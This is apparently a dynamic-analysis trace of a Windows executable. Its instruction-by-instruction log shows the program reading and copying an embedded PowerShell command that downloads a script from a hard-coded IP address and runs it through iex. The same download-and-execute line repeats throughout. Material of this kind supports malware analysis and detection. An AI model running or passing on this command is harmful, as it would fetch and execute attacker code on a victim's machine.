@@ -1,0 +1,425 @@
+[T0] 0x00007ff745e112b4 a0aeb837cb5e762fc0b7d657c71d343e765cccb5780cd315756f682418b3cdfe.exe:unnamedImageEntryPoint+0x000000000004 | call 0x7ff745e117a0 | [Write]: 
+        [0x0000009c9c3afbd8] = 0x00007ff745e112b9 (140700006027961)
+-------------------------------------------------------------------------------------------------------------------------------------
+[T0] 0x00007ff745e1cd2b a0aeb837cb5e762fc0b7d657c71d343e765cccb5780cd315756f682418b3cdfe.exe:unnamedImageEntryPoint+0x00000000ba7b | mov rdx, qword ptr [rcx] | [Read 1Op]: 
+        [0x0000009c9c3afb78] = 0x00007ff745e2a8a0 (140700006131872)
+-------------------------------------------------------------------------------------------------------------------------------------
+[T0] 0x00007ff745e1cd38 a0aeb837cb5e762fc0b7d657c71d343e765cccb5780cd315756f682418b3cdfe.exe:unnamedImageEntryPoint+0x00000000ba88 | cmp byte ptr [rdx+rax*1], r8b | [Read 1Op]: 
+        [0x00007ff745e2a8a0] = 0x70 (112) -> "powershell -Command "iwr -useb 'http://147.45.44.131/infopage/bhdh552.ps1' -Headers @{'X-Special-Header'='qInx8F3tuJDHXgOEfPJjbaipYaSE1mobJ2YRyo2rjNgnVDhJvevN8R2ku8oPCBonhmpzFb2GYqPiLhJq'} | iex""
+-------------------------------------------------------------------------------------------------------------------------------------
+[T0] 0x00007ff745e1cd38 a0aeb837cb5e762fc0b7d657c71d343e765cccb5780cd315756f682418b3cdfe.exe:unnamedImageEntryPoint+0x00000000ba88 | cmp byte ptr [rdx+rax*1], r8b | [Read 1Op]: 
+        [0x00007ff745e2a8a1] = 0x6f (111) -> "owershell -Command "iwr -useb 'http://147.45.44.131/infopage/bhdh552.ps1' -Headers @{'X-Special-Header'='qInx8F3tuJDHXgOEfPJjbaipYaSE1mobJ2YRyo2rjNgnVDhJvevN8R2ku8oPCBonhmpzFb2GYqPiLhJq'} | iex""
+-------------------------------------------------------------------------------------------------------------------------------------
+[T0] 0x00007ff745e1cd38 a0aeb837cb5e762fc0b7d657c71d343e765cccb5780cd315756f682418b3cdfe.exe:unnamedImageEntryPoint+0x00000000ba88 | cmp byte ptr [rdx+rax*1], r8b | [Read 1Op]: 
+        [0x00007ff745e2a8a2] = 0x77 (119) -> "wershell -Command "iwr -useb 'http://147.45.44.131/infopage/bhdh552.ps1' -Headers @{'X-Special-Header'='qInx8F3tuJDHXgOEfPJjbaipYaSE1mobJ2YRyo2rjNgnVDhJvevN8R2ku8oPCBonhmpzFb2GYqPiLhJq'} | iex""
+-------------------------------------------------------------------------------------------------------------------------------------
+[T0] 0x00007ff745e1cd38 a0aeb837cb5e762fc0b7d657c71d343e765cccb5780cd315756f682418b3cdfe.exe:unnamedImageEntryPoint+0x00000000ba88 | cmp byte ptr [rdx+rax*1], r8b | [Read 1Op]: 
+        [0x00007ff745e2a8a3] = 0x65 (101) -> "ershell -Command "iwr -useb 'http://147.45.44.131/infopage/bhdh552.ps1' -Headers @{'X-Special-Header'='qInx8F3tuJDHXgOEfPJjbaipYaSE1mobJ2YRyo2rjNgnVDhJvevN8R2ku8oPCBonhmpzFb2GYqPiLhJq'} | iex""
+-------------------------------------------------------------------------------------------------------------------------------------
+[T0] 0x00007ff745e1cd38 a0aeb837cb5e762fc0b7d657c71d343e765cccb5780cd315756f682418b3cdfe.exe:unnamedImageEntryPoint+0x00000000ba88 | cmp byte ptr [rdx+rax*1], r8b | [Read 1Op]: 
+        [0x00007ff745e2a8a4] = 0x72 (114) -> "rshell -Command "iwr -useb 'http://147.45.44.131/infopage/bhdh552.ps1' -Headers @{'X-Special-Header'='qInx8F3tuJDHXgOEfPJjbaipYaSE1mobJ2YRyo2rjNgnVDhJvevN8R2ku8oPCBonhmpzFb2GYqPiLhJq'} | iex""
+-------------------------------------------------------------------------------------------------------------------------------------
+[T0] 0x00007ff745e1cd38 a0aeb837cb5e762fc0b7d657c71d343e765cccb5780cd315756f682418b3cdfe.exe:unnamedImageEntryPoint+0x00000000ba88 | cmp byte ptr [rdx+rax*1], r8b | [Read 1Op]: 
+        [0x00007ff745e2a8a5] = 0x73 (115) -> "shell -Command "iwr -useb 'http://147.45.44.131/infopage/bhdh552.ps1' -Headers @{'X-Special-Header'='qInx8F3tuJDHXgOEfPJjbaipYaSE1mobJ2YRyo2rjNgnVDhJvevN8R2ku8oPCBonhmpzFb2GYqPiLhJq'} | iex""
+-------------------------------------------------------------------------------------------------------------------------------------
+[T0] 0x00007ff745e1cd38 a0aeb837cb5e762fc0b7d657c71d343e765cccb5780cd315756f682418b3cdfe.exe:unnamedImageEntryPoint+0x00000000ba88 | cmp byte ptr [rdx+rax*1], r8b | [Read 1Op]: 
+        [0x00007ff745e2a8a6] = 0x68 (104) -> "hell -Command "iwr -useb 'http://147.45.44.131/infopage/bhdh552.ps1' -Headers @{'X-Special-Header'='qInx8F3tuJDHXgOEfPJjbaipYaSE1mobJ2YRyo2rjNgnVDhJvevN8R2ku8oPCBonhmpzFb2GYqPiLhJq'} | iex""
+-------------------------------------------------------------------------------------------------------------------------------------
+[T0] 0x00007ff745e1cd38 a0aeb837cb5e762fc0b7d657c71d343e765cccb5780cd315756f682418b3cdfe.exe:unnamedImageEntryPoint+0x00000000ba88 | cmp byte ptr [rdx+rax*1], r8b | [Read 1Op]: 
+        [0x00007ff745e2a8a7] = 0x65 (101) -> "ell -Command "iwr -useb 'http://147.45.44.131/infopage/bhdh552.ps1' -Headers @{'X-Special-Header'='qInx8F3tuJDHXgOEfPJjbaipYaSE1mobJ2YRyo2rjNgnVDhJvevN8R2ku8oPCBonhmpzFb2GYqPiLhJq'} | iex""
+-------------------------------------------------------------------------------------------------------------------------------------
+[T0] 0x00007ff745e1cd38 a0aeb837cb5e762fc0b7d657c71d343e765cccb5780cd315756f682418b3cdfe.exe:unnamedImageEntryPoint+0x00000000ba88 | cmp byte ptr [rdx+rax*1], r8b | [Read 1Op]: 
+        [0x00007ff745e2a8a8] = 0x6c (108) -> "ll -Command "iwr -useb 'http://147.45.44.131/infopage/bhdh552.ps1' -Headers @{'X-Special-Header'='qInx8F3tuJDHXgOEfPJjbaipYaSE1mobJ2YRyo2rjNgnVDhJvevN8R2ku8oPCBonhmpzFb2GYqPiLhJq'} | iex""
+-------------------------------------------------------------------------------------------------------------------------------------
+[T0] 0x00007ff745e1cd38 a0aeb837cb5e762fc0b7d657c71d343e765cccb5780cd315756f682418b3cdfe.exe:unnamedImageEntryPoint+0x00000000ba88 | cmp byte ptr [rdx+rax*1], r8b | [Read 1Op]: 
+        [0x00007ff745e2a8a9] = 0x6c (108) -> "l -Command "iwr -useb 'http://147.45.44.131/infopage/bhdh552.ps1' -Headers @{'X-Special-Header'='qInx8F3tuJDHXgOEfPJjbaipYaSE1mobJ2YRyo2rjNgnVDhJvevN8R2ku8oPCBonhmpzFb2GYqPiLhJq'} | iex""
+-------------------------------------------------------------------------------------------------------------------------------------
+[T0] 0x00007ff745e1cd38 a0aeb837cb5e762fc0b7d657c71d343e765cccb5780cd315756f682418b3cdfe.exe:unnamedImageEntryPoint+0x00000000ba88 | cmp byte ptr [rdx+rax*1], r8b | [Read 1Op]: 
+        [0x00007ff745e2a8aa] = 0x20 (32) -> " -Command "iwr -useb 'http://147.45.44.131/infopage/bhdh552.ps1' -Headers @{'X-Special-Header'='qInx8F3tuJDHXgOEfPJjbaipYaSE1mobJ2YRyo2rjNgnVDhJvevN8R2ku8oPCBonhmpzFb2GYqPiLhJq'} | iex""
+-------------------------------------------------------------------------------------------------------------------------------------
+[T0] 0x00007ff745e1cd38 a0aeb837cb5e762fc0b7d657c71d343e765cccb5780cd315756f682418b3cdfe.exe:unnamedImageEntryPoint+0x00000000ba88 | cmp byte ptr [rdx+rax*1], r8b | [Read 1Op]: 
+        [0x00007ff745e2a8ab] = 0x2d (45) -> "-Command "iwr -useb 'http://147.45.44.131/infopage/bhdh552.ps1' -Headers @{'X-Special-Header'='qInx8F3tuJDHXgOEfPJjbaipYaSE1mobJ2YRyo2rjNgnVDhJvevN8R2ku8oPCBonhmpzFb2GYqPiLhJq'} | iex""
+-------------------------------------------------------------------------------------------------------------------------------------
+[T0] 0x00007ff745e1cd38 a0aeb837cb5e762fc0b7d657c71d343e765cccb5780cd315756f682418b3cdfe.exe:unnamedImageEntryPoint+0x00000000ba88 | cmp byte ptr [rdx+rax*1], r8b | [Read 1Op]: 
+        [0x00007ff745e2a8ac] = 0x43 (67) -> "Command "iwr -useb 'http://147.45.44.131/infopage/bhdh552.ps1' -Headers @{'X-Special-Header'='qInx8F3tuJDHXgOEfPJjbaipYaSE1mobJ2YRyo2rjNgnVDhJvevN8R2ku8oPCBonhmpzFb2GYqPiLhJq'} | iex""
+-------------------------------------------------------------------------------------------------------------------------------------
+[T0] 0x00007ff745e1cd38 a0aeb837cb5e762fc0b7d657c71d343e765cccb5780cd315756f682418b3cdfe.exe:unnamedImageEntryPoint+0x00000000ba88 | cmp byte ptr [rdx+rax*1], r8b | [Read 1Op]: 
+        [0x00007ff745e2a8ad] = 0x6f (111) -> "ommand "iwr -useb 'http://147.45.44.131/infopage/bhdh552.ps1' -Headers @{'X-Special-Header'='qInx8F3tuJDHXgOEfPJjbaipYaSE1mobJ2YRyo2rjNgnVDhJvevN8R2ku8oPCBonhmpzFb2GYqPiLhJq'} | iex""
+-------------------------------------------------------------------------------------------------------------------------------------
+[T0] 0x00007ff745e1cd38 a0aeb837cb5e762fc0b7d657c71d343e765cccb5780cd315756f682418b3cdfe.exe:unnamedImageEntryPoint+0x00000000ba88 | cmp byte ptr [rdx+rax*1], r8b | [Read 1Op]: 
+        [0x00007ff745e2a8ae] = 0x6d (109) -> "mmand "iwr -useb 'http://147.45.44.131/infopage/bhdh552.ps1' -Headers @{'X-Special-Header'='qInx8F3tuJDHXgOEfPJjbaipYaSE1mobJ2YRyo2rjNgnVDhJvevN8R2ku8oPCBonhmpzFb2GYqPiLhJq'} | iex""
+-------------------------------------------------------------------------------------------------------------------------------------
+[T0] 0x00007ff745e1cd38 a0aeb837cb5e762fc0b7d657c71d343e765cccb5780cd315756f682418b3cdfe.exe:unnamedImageEntryPoint+0x00000000ba88 | cmp byte ptr [rdx+rax*1], r8b | [Read 1Op]: 
+        [0x00007ff745e2a8af] = 0x6d (109) -> "mand "iwr -useb 'http://147.45.44.131/infopage/bhdh552.ps1' -Headers @{'X-Special-Header'='qInx8F3tuJDHXgOEfPJjbaipYaSE1mobJ2YRyo2rjNgnVDhJvevN8R2ku8oPCBonhmpzFb2GYqPiLhJq'} | iex""
+-------------------------------------------------------------------------------------------------------------------------------------
+[T0] 0x00007ff745e1cd38 a0aeb837cb5e762fc0b7d657c71d343e765cccb5780cd315756f682418b3cdfe.exe:unnamedImageEntryPoint+0x00000000ba88 | cmp byte ptr [rdx+rax*1], r8b | [Read 1Op]: 
+        [0x00007ff745e2a8b0] = 0x61 (97) -> "and "iwr -useb 'http://147.45.44.131/infopage/bhdh552.ps1' -Headers @{'X-Special-Header'='qInx8F3tuJDHXgOEfPJjbaipYaSE1mobJ2YRyo2rjNgnVDhJvevN8R2ku8oPCBonhmpzFb2GYqPiLhJq'} | iex""
+-------------------------------------------------------------------------------------------------------------------------------------
+[T0] 0x00007ff745e1cd38 a0aeb837cb5e762fc0b7d657c71d343e765cccb5780cd315756f682418b3cdfe.exe:unnamedImageEntryPoint+0x00000000ba88 | cmp byte ptr [rdx+rax*1], r8b | [Read 1Op]: 
+        [0x00007ff745e2a8b1] = 0x6e (110) -> "nd "iwr -useb 'http://147.45.44.131/infopage/bhdh552.ps1' -Headers @{'X-Special-Header'='qInx8F3tuJDHXgOEfPJjbaipYaSE1mobJ2YRyo2rjNgnVDhJvevN8R2ku8oPCBonhmpzFb2GYqPiLhJq'} | iex""
+-------------------------------------------------------------------------------------------------------------------------------------
+[T0] 0x00007ff745e1cd38 a0aeb837cb5e762fc0b7d657c71d343e765cccb5780cd315756f682418b3cdfe.exe:unnamedImageEntryPoint+0x00000000ba88 | cmp byte ptr [rdx+rax*1], r8b | [Read 1Op]: 
+        [0x00007ff745e2a8b2] = 0x64 (100) -> "d "iwr -useb 'http://147.45.44.131/infopage/bhdh552.ps1' -Headers @{'X-Special-Header'='qInx8F3tuJDHXgOEfPJjbaipYaSE1mobJ2YRyo2rjNgnVDhJvevN8R2ku8oPCBonhmpzFb2GYqPiLhJq'} | iex""
+-------------------------------------------------------------------------------------------------------------------------------------
+[T0] 0x00007ff745e1cd38 a0aeb837cb5e762fc0b7d657c71d343e765cccb5780cd315756f682418b3cdfe.exe:unnamedImageEntryPoint+0x00000000ba88 | cmp byte ptr [rdx+rax*1], r8b | [Read 1Op]: 
+        [0x00007ff745e2a8b3] = 0x20 (32) -> " "iwr -useb 'http://147.45.44.131/infopage/bhdh552.ps1' -Headers @{'X-Special-Header'='qInx8F3tuJDHXgOEfPJjbaipYaSE1mobJ2YRyo2rjNgnVDhJvevN8R2ku8oPCBonhmpzFb2GYqPiLhJq'} | iex""
+-------------------------------------------------------------------------------------------------------------------------------------
+[T0] 0x00007ff745e1cd38 a0aeb837cb5e762fc0b7d657c71d343e765cccb5780cd315756f682418b3cdfe.exe:unnamedImageEntryPoint+0x00000000ba88 | cmp byte ptr [rdx+rax*1], r8b | [Read 1Op]: 
+        [0x00007ff745e2a8b4] = 0x22 (34) -> ""iwr -useb 'http://147.45.44.131/infopage/bhdh552.ps1' -Headers @{'X-Special-Header'='qInx8F3tuJDHXgOEfPJjbaipYaSE1mobJ2YRyo2rjNgnVDhJvevN8R2ku8oPCBonhmpzFb2GYqPiLhJq'} | iex""
+-------------------------------------------------------------------------------------------------------------------------------------
+[T0] 0x00007ff745e1cd38 a0aeb837cb5e762fc0b7d657c71d343e765cccb5780cd315756f682418b3cdfe.exe:unnamedImageEntryPoint+0x00000000ba88 | cmp byte ptr [rdx+rax*1], r8b | [Read 1Op]: 
+        [0x00007ff745e2a8b5] = 0x69 (105) -> "iwr -useb 'http://147.45.44.131/infopage/bhdh552.ps1' -Headers @{'X-Special-Header'='qInx8F3tuJDHXgOEfPJjbaipYaSE1mobJ2YRyo2rjNgnVDhJvevN8R2ku8oPCBonhmpzFb2GYqPiLhJq'} | iex""
+-------------------------------------------------------------------------------------------------------------------------------------
+[T0] 0x00007ff745e1cd38 a0aeb837cb5e762fc0b7d657c71d343e765cccb5780cd315756f682418b3cdfe.exe:unnamedImageEntryPoint+0x00000000ba88 | cmp byte ptr [rdx+rax*1], r8b | [Read 1Op]: 
+        [0x00007ff745e2a8b6] = 0x77 (119) -> "wr -useb 'http://147.45.44.131/infopage/bhdh552.ps1' -Headers @{'X-Special-Header'='qInx8F3tuJDHXgOEfPJjbaipYaSE1mobJ2YRyo2rjNgnVDhJvevN8R2ku8oPCBonhmpzFb2GYqPiLhJq'} | iex""
+-------------------------------------------------------------------------------------------------------------------------------------
+[T0] 0x00007ff745e1cd38 a0aeb837cb5e762fc0b7d657c71d343e765cccb5780cd315756f682418b3cdfe.exe:unnamedImageEntryPoint+0x00000000ba88 | cmp byte ptr [rdx+rax*1], r8b | [Read 1Op]: 
+        [0x00007ff745e2a8b7] = 0x72 (114) -> "r -useb 'http://147.45.44.131/infopage/bhdh552.ps1' -Headers @{'X-Special-Header'='qInx8F3tuJDHXgOEfPJjbaipYaSE1mobJ2YRyo2rjNgnVDhJvevN8R2ku8oPCBonhmpzFb2GYqPiLhJq'} | iex""
+-------------------------------------------------------------------------------------------------------------------------------------
+[T0] 0x00007ff745e1cd38 a0aeb837cb5e762fc0b7d657c71d343e765cccb5780cd315756f682418b3cdfe.exe:unnamedImageEntryPoint+0x00000000ba88 | cmp byte ptr [rdx+rax*1], r8b | [Read 1Op]: 
+        [0x00007ff745e2a8b8] = 0x20 (32) -> " -useb 'http://147.45.44.131/infopage/bhdh552.ps1' -Headers @{'X-Special-Header'='qInx8F3tuJDHXgOEfPJjbaipYaSE1mobJ2YRyo2rjNgnVDhJvevN8R2ku8oPCBonhmpzFb2GYqPiLhJq'} | iex""
+-------------------------------------------------------------------------------------------------------------------------------------
+[T0] 0x00007ff745e1cd38 a0aeb837cb5e762fc0b7d657c71d343e765cccb5780cd315756f682418b3cdfe.exe:unnamedImageEntryPoint+0x00000000ba88 | cmp byte ptr [rdx+rax*1], r8b | [Read 1Op]: 
+        [0x00007ff745e2a8b9] = 0x2d (45) -> "-useb 'http://147.45.44.131/infopage/bhdh552.ps1' -Headers @{'X-Special-Header'='qInx8F3tuJDHXgOEfPJjbaipYaSE1mobJ2YRyo2rjNgnVDhJvevN8R2ku8oPCBonhmpzFb2GYqPiLhJq'} | iex""
+-------------------------------------------------------------------------------------------------------------------------------------
+[T0] 0x00007ff745e1cd38 a0aeb837cb5e762fc0b7d657c71d343e765cccb5780cd315756f682418b3cdfe.exe:unnamedImageEntryPoint+0x00000000ba88 | cmp byte ptr [rdx+rax*1], r8b | [Read 1Op]: 
+        [0x00007ff745e2a8ba] = 0x75 (117) -> "useb 'http://147.45.44.131/infopage/bhdh552.ps1' -Headers @{'X-Special-Header'='qInx8F3tuJDHXgOEfPJjbaipYaSE1mobJ2YRyo2rjNgnVDhJvevN8R2ku8oPCBonhmpzFb2GYqPiLhJq'} | iex""
+-------------------------------------------------------------------------------------------------------------------------------------
+[T0] 0x00007ff745e1cd38 a0aeb837cb5e762fc0b7d657c71d343e765cccb5780cd315756f682418b3cdfe.exe:unnamedImageEntryPoint+0x00000000ba88 | cmp byte ptr [rdx+rax*1], r8b | [Read 1Op]: 
+        [0x00007ff745e2a8bb] = 0x73 (115) -> "seb 'http://147.45.44.131/infopage/bhdh552.ps1' -Headers @{'X-Special-Header'='qInx8F3tuJDHXgOEfPJjbaipYaSE1mobJ2YRyo2rjNgnVDhJvevN8R2ku8oPCBonhmpzFb2GYqPiLhJq'} | iex""
+-------------------------------------------------------------------------------------------------------------------------------------
+[T0] 0x00007ff745e1cd38 a0aeb837cb5e762fc0b7d657c71d343e765cccb5780cd315756f682418b3cdfe.exe:unnamedImageEntryPoint+0x00000000ba88 | cmp byte ptr [rdx+rax*1], r8b | [Read 1Op]: 
+        [0x00007ff745e2a8bc] = 0x65 (101) -> "eb 'http://147.45.44.131/infopage/bhdh552.ps1' -Headers @{'X-Special-Header'='qInx8F3tuJDHXgOEfPJjbaipYaSE1mobJ2YRyo2rjNgnVDhJvevN8R2ku8oPCBonhmpzFb2GYqPiLhJq'} | iex""
+-------------------------------------------------------------------------------------------------------------------------------------
+[T0] 0x00007ff745e1cd38 a0aeb837cb5e762fc0b7d657c71d343e765cccb5780cd315756f682418b3cdfe.exe:unnamedImageEntryPoint+0x00000000ba88 | cmp byte ptr [rdx+rax*1], r8b | [Read 1Op]: 
+        [0x00007ff745e2a8bd] = 0x62 (98) -> "b 'http://147.45.44.131/infopage/bhdh552.ps1' -Headers @{'X-Special-Header'='qInx8F3tuJDHXgOEfPJjbaipYaSE1mobJ2YRyo2rjNgnVDhJvevN8R2ku8oPCBonhmpzFb2GYqPiLhJq'} | iex""
+-------------------------------------------------------------------------------------------------------------------------------------
+[T0] 0x00007ff745e1cd38 a0aeb837cb5e762fc0b7d657c71d343e765cccb5780cd315756f682418b3cdfe.exe:unnamedImageEntryPoint+0x00000000ba88 | cmp byte ptr [rdx+rax*1], r8b | [Read 1Op]: 
+        [0x00007ff745e2a8be] = 0x20 (32) -> " 'http://147.45.44.131/infopage/bhdh552.ps1' -Headers @{'X-Special-Header'='qInx8F3tuJDHXgOEfPJjbaipYaSE1mobJ2YRyo2rjNgnVDhJvevN8R2ku8oPCBonhmpzFb2GYqPiLhJq'} | iex""
+-------------------------------------------------------------------------------------------------------------------------------------
+[T0] 0x00007ff745e1cd38 a0aeb837cb5e762fc0b7d657c71d343e765cccb5780cd315756f682418b3cdfe.exe:unnamedImageEntryPoint+0x00000000ba88 | cmp byte ptr [rdx+rax*1], r8b | [Read 1Op]: 
+        [0x00007ff745e2a8bf] = 0x27 (39) -> "'http://147.45.44.131/infopage/bhdh552.ps1' -Headers @{'X-Special-Header'='qInx8F3tuJDHXgOEfPJjbaipYaSE1mobJ2YRyo2rjNgnVDhJvevN8R2ku8oPCBonhmpzFb2GYqPiLhJq'} | iex""
+-------------------------------------------------------------------------------------------------------------------------------------
+[T0] 0x00007ff745e1cd38 a0aeb837cb5e762fc0b7d657c71d343e765cccb5780cd315756f682418b3cdfe.exe:unnamedImageEntryPoint+0x00000000ba88 | cmp byte ptr [rdx+rax*1], r8b | [Read 1Op]: 
+        [0x00007ff745e2a8c0] = 0x68 (104) -> "http://147.45.44.131/infopage/bhdh552.ps1' -Headers @{'X-Special-Header'='qInx8F3tuJDHXgOEfPJjbaipYaSE1mobJ2YRyo2rjNgnVDhJvevN8R2ku8oPCBonhmpzFb2GYqPiLhJq'} | iex""
+-------------------------------------------------------------------------------------------------------------------------------------
+[T0] 0x00007ff745e1cd38 a0aeb837cb5e762fc0b7d657c71d343e765cccb5780cd315756f682418b3cdfe.exe:unnamedImageEntryPoint+0x00000000ba88 | cmp byte ptr [rdx+rax*1], r8b | [Read 1Op]: 
+        [0x00007ff745e2a8c1] = 0x74 (116) -> "ttp://147.45.44.131/infopage/bhdh552.ps1' -Headers @{'X-Special-Header'='qInx8F3tuJDHXgOEfPJjbaipYaSE1mobJ2YRyo2rjNgnVDhJvevN8R2ku8oPCBonhmpzFb2GYqPiLhJq'} | iex""
+-------------------------------------------------------------------------------------------------------------------------------------
+[T0] 0x00007ff745e16a88 a0aeb837cb5e762fc0b7d657c71d343e765cccb5780cd315756f682418b3cdfe.exe:unnamedImageEntryPoint+0x0000000057d8 | push rbx | [Write]: 
+        [0x0000009c9c3af940] = 0x000001fa6e270750 (2175101503312)
+-------------------------------------------------------------------------------------------------------------------------------------
+[T0] 0x00007ff745e16ac0 a0aeb837cb5e762fc0b7d657c71d343e765cccb5780cd315756f682418b3cdfe.exe:unnamedImageEntryPoint+0x000000005810 | mov al, byte ptr [r8+r9*1] | [Read 1Op]: 
+        [0x00007ff745e2a8a0] = 0x70 (112) -> "powershell -Command "iwr -useb 'http://147.45.44.131/infopage/bhdh552.ps1' -Headers @{'X-Special-Header'='qInx8F3tuJDHXgOEfPJjbaipYaSE1mobJ2YRyo2rjNgnVDhJvevN8R2ku8oPCBonhmpzFb2GYqPiLhJq'} | iex""
+-------------------------------------------------------------------------------------------------------------------------------------
+[T0] 0x00007ff745e16ac4 a0aeb837cb5e762fc0b7d657c71d343e765cccb5780cd315756f682418b3cdfe.exe:unnamedImageEntryPoint+0x000000005814 | mov byte ptr [r9], al | [Write]: 
+        [0x000001fa6e27076f] = 0x70 (112) -> "p"
+-------------------------------------------------------------------------------------------------------------------------------------
+[T0] 0x00007ff745e16ac0 a0aeb837cb5e762fc0b7d657c71d343e765cccb5780cd315756f682418b3cdfe.exe:unnamedImageEntryPoint+0x000000005810 | mov al, byte ptr [r8+r9*1] | [Read 1Op]: 
+        [0x00007ff745e2a8a1] = 0x6f (111) -> "owershell -Command "iwr -useb 'http://147.45.44.131/infopage/bhdh552.ps1' -Headers @{'X-Special-Header'='qInx8F3tuJDHXgOEfPJjbaipYaSE1mobJ2YRyo2rjNgnVDhJvevN8R2ku8oPCBonhmpzFb2GYqPiLhJq'} | iex""
+-------------------------------------------------------------------------------------------------------------------------------------
+[T0] 0x00007ff745e16ac4 a0aeb837cb5e762fc0b7d657c71d343e765cccb5780cd315756f682418b3cdfe.exe:unnamedImageEntryPoint+0x000000005814 | mov byte ptr [r9], al | [Write]: 
+        [0x000001fa6e270770] = 0x6f (111) -> "o"
+-------------------------------------------------------------------------------------------------------------------------------------
+[T0] 0x00007ff745e16ac0 a0aeb837cb5e762fc0b7d657c71d343e765cccb5780cd315756f682418b3cdfe.exe:unnamedImageEntryPoint+0x000000005810 | mov al, byte ptr [r8+r9*1] | [Read 1Op]: 
+        [0x00007ff745e2a8a2] = 0x77 (119) -> "wershell -Command "iwr -useb 'http://147.45.44.131/infopage/bhdh552.ps1' -Headers @{'X-Special-Header'='qInx8F3tuJDHXgOEfPJjbaipYaSE1mobJ2YRyo2rjNgnVDhJvevN8R2ku8oPCBonhmpzFb2GYqPiLhJq'} | iex""
+-------------------------------------------------------------------------------------------------------------------------------------
+[T0] 0x00007ff745e16ac4 a0aeb837cb5e762fc0b7d657c71d343e765cccb5780cd315756f682418b3cdfe.exe:unnamedImageEntryPoint+0x000000005814 | mov byte ptr [r9], al | [Write]: 
+        [0x000001fa6e270771] = 0x77 (119) -> "w"
+-------------------------------------------------------------------------------------------------------------------------------------
+[T0] 0x00007ff745e16ac0 a0aeb837cb5e762fc0b7d657c71d343e765cccb5780cd315756f682418b3cdfe.exe:unnamedImageEntryPoint+0x000000005810 | mov al, byte ptr [r8+r9*1] | [Read 1Op]: 
+        [0x00007ff745e2a8a3] = 0x65 (101) -> "ershell -Command "iwr -useb 'http://147.45.44.131/infopage/bhdh552.ps1' -Headers @{'X-Special-Header'='qInx8F3tuJDHXgOEfPJjbaipYaSE1mobJ2YRyo2rjNgnVDhJvevN8R2ku8oPCBonhmpzFb2GYqPiLhJq'} | iex""
+-------------------------------------------------------------------------------------------------------------------------------------
+[T0] 0x00007ff745e16ac4 a0aeb837cb5e762fc0b7d657c71d343e765cccb5780cd315756f682418b3cdfe.exe:unnamedImageEntryPoint+0x000000005814 | mov byte ptr [r9], al | [Write]: 
+        [0x000001fa6e270772] = 0x65 (101) -> "e"
+-------------------------------------------------------------------------------------------------------------------------------------
+[T0] 0x00007ff745e16ac0 a0aeb837cb5e762fc0b7d657c71d343e765cccb5780cd315756f682418b3cdfe.exe:unnamedImageEntryPoint+0x000000005810 | mov al, byte ptr [r8+r9*1] | [Read 1Op]: 
+        [0x00007ff745e2a8a4] = 0x72 (114) -> "rshell -Command "iwr -useb 'http://147.45.44.131/infopage/bhdh552.ps1' -Headers @{'X-Special-Header'='qInx8F3tuJDHXgOEfPJjbaipYaSE1mobJ2YRyo2rjNgnVDhJvevN8R2ku8oPCBonhmpzFb2GYqPiLhJq'} | iex""
+-------------------------------------------------------------------------------------------------------------------------------------
+[T0] 0x00007ff745e16ac4 a0aeb837cb5e762fc0b7d657c71d343e765cccb5780cd315756f682418b3cdfe.exe:unnamedImageEntryPoint+0x000000005814 | mov byte ptr [r9], al | [Write]: 
+        [0x000001fa6e270773] = 0x72 (114) -> "r"
+-------------------------------------------------------------------------------------------------------------------------------------
+[T0] 0x00007ff745e16ac0 a0aeb837cb5e762fc0b7d657c71d343e765cccb5780cd315756f682418b3cdfe.exe:unnamedImageEntryPoint+0x000000005810 | mov al, byte ptr [r8+r9*1] | [Read 1Op]: 
+        [0x00007ff745e2a8a5] = 0x73 (115) -> "shell -Command "iwr -useb 'http://147.45.44.131/infopage/bhdh552.ps1' -Headers @{'X-Special-Header'='qInx8F3tuJDHXgOEfPJjbaipYaSE1mobJ2YRyo2rjNgnVDhJvevN8R2ku8oPCBonhmpzFb2GYqPiLhJq'} | iex""
+-------------------------------------------------------------------------------------------------------------------------------------
+[T0] 0x00007ff745e16ac4 a0aeb837cb5e762fc0b7d657c71d343e765cccb5780cd315756f682418b3cdfe.exe:unnamedImageEntryPoint+0x000000005814 | mov byte ptr [r9], al | [Write]: 
+        [0x000001fa6e270774] = 0x73 (115) -> "s"
+-------------------------------------------------------------------------------------------------------------------------------------
+[T0] 0x00007ff745e16ac0 a0aeb837cb5e762fc0b7d657c71d343e765cccb5780cd315756f682418b3cdfe.exe:unnamedImageEntryPoint+0x000000005810 | mov al, byte ptr [r8+r9*1] | [Read 1Op]: 
+        [0x00007ff745e2a8a6] = 0x68 (104) -> "hell -Command "iwr -useb 'http://147.45.44.131/infopage/bhdh552.ps1' -Headers @{'X-Special-Header'='qInx8F3tuJDHXgOEfPJjbaipYaSE1mobJ2YRyo2rjNgnVDhJvevN8R2ku8oPCBonhmpzFb2GYqPiLhJq'} | iex""
+-------------------------------------------------------------------------------------------------------------------------------------
+[T0] 0x00007ff745e16ac4 a0aeb837cb5e762fc0b7d657c71d343e765cccb5780cd315756f682418b3cdfe.exe:unnamedImageEntryPoint+0x000000005814 | mov byte ptr [r9], al | [Write]: 
+        [0x000001fa6e270775] = 0x68 (104) -> "h"
+-------------------------------------------------------------------------------------------------------------------------------------
+[T0] 0x00007ff745e16ac0 a0aeb837cb5e762fc0b7d657c71d343e765cccb5780cd315756f682418b3cdfe.exe:unnamedImageEntryPoint+0x000000005810 | mov al, byte ptr [r8+r9*1] | [Read 1Op]: 
+        [0x00007ff745e2a8a7] = 0x65 (101) -> "ell -Command "iwr -useb 'http://147.45.44.131/infopage/bhdh552.ps1' -Headers @{'X-Special-Header'='qInx8F3tuJDHXgOEfPJjbaipYaSE1mobJ2YRyo2rjNgnVDhJvevN8R2ku8oPCBonhmpzFb2GYqPiLhJq'} | iex""
+-------------------------------------------------------------------------------------------------------------------------------------
+[T0] 0x00007ff745e16ac4 a0aeb837cb5e762fc0b7d657c71d343e765cccb5780cd315756f682418b3cdfe.exe:unnamedImageEntryPoint+0x000000005814 | mov byte ptr [r9], al | [Write]: 
+        [0x000001fa6e270776] = 0x65 (101) -> "e"
+-------------------------------------------------------------------------------------------------------------------------------------
+[T0] 0x00007ff745e16ac0 a0aeb837cb5e762fc0b7d657c71d343e765cccb5780cd315756f682418b3cdfe.exe:unnamedImageEntryPoint+0x000000005810 | mov al, byte ptr [r8+r9*1] | [Read 1Op]: 
+        [0x00007ff745e2a8a8] = 0x6c (108) -> "ll -Command "iwr -useb 'http://147.45.44.131/infopage/bhdh552.ps1' -Headers @{'X-Special-Header'='qInx8F3tuJDHXgOEfPJjbaipYaSE1mobJ2YRyo2rjNgnVDhJvevN8R2ku8oPCBonhmpzFb2GYqPiLhJq'} | iex""
